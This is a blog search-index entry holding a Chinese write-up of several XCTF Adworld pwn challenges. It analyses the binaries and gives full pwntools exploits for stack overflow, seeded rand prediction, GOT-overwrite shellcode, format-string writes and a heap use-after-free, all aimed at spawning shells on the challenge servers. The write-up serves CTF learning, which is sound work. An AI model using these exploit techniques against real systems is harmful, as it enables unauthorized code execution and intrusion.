@@ -532,4 +532,137 @@
         <tag>unlink</tag>
       </tags>
   </entry>
+  <entry>
+    <title>攻防世界pwn进阶</title>
+    <url>/posts/5600bec/</url>
+    <content><![CDATA[<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><p><img src="/posts/5600bec/image-20201123091050404.png" alt="image-20201123091050404"></p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>先查看一下保护。</p>
+<p><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
+<p>只开启了堆栈不可执行。</p>
+<p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
+<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
+<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
+<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
+<h3 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
+<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><p><img src="/posts/5600bec/image-20201123094300324.png" alt="image-20201123094300324"></p>
+<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下</p>
+<p><img src="/posts/5600bec/image-20201123094345375.png" alt="image-20201123094345375"></p>
+<p>通过ida反编译阅读源码</p>
+<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
+<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
+<p><img src="/posts/5600bec/image-20201123094627108.png" alt="image-20201123094627108"></p>
+<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
+<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
+<h3 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
+<p>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
+<h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223112703.png"></p>
+<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"></p>
+<p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223736816.png" alt="image-20201123223736816"></p>
+<p>其中只实现了add和delete。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
+<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
+<p>对于获取输入的函数也有需要注意的地方：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
+<p>关于delete函数：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
+<h3 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
+<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
+<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
+<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>
+
+<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
+<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
+<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
+<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
+<p>chunk的状态如图所示，为了统一。将jmp指令放在最后，所需的指令与jmp之间用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是8+8+8+1 = 0x19.即跳转指令<code>\xeb\x19</code>。</p>
+<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
+<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
+<p>所以得到exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
+<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083325372.png" alt="image-20201125083325372"></p>
+<p>checksec:</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
+<h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
+<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
+<p>这显然是一个格式化字符串漏洞。</p>
+<h3 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
+<p>那么首先，寻找格式化字符串的偏移。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
+<p>可以看到偏移为12.</p>
+<p>使用ida查询key的地址</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
+<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
+<p>最终exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
+<h2 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
+<p>首先checksec</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
+<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
+<p>显然这里存在的是格式化字符串漏洞。</p>
+<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。要利用这个格式化字符串漏洞，首先需要找到偏移。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
+<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
+<h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
+<p>删除堆：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
+<p>输出堆的内容：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
+<p>添加堆：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
+<p>自定义的输出函数</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
+<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
+<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数，ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
+<p>用图来说明关系：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
+<h3 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
+<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
+<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
+<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
+<p>图片演示过程：</p>
+<ul>
+<li>申请两个chunk</li>
+</ul>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
+<ul>
+<li>依次删除0、1后再申请0x8的chunk</li>
+</ul>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
+<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>-攻防世界</tag>
+      </tags>
+  </entry>
 </search>
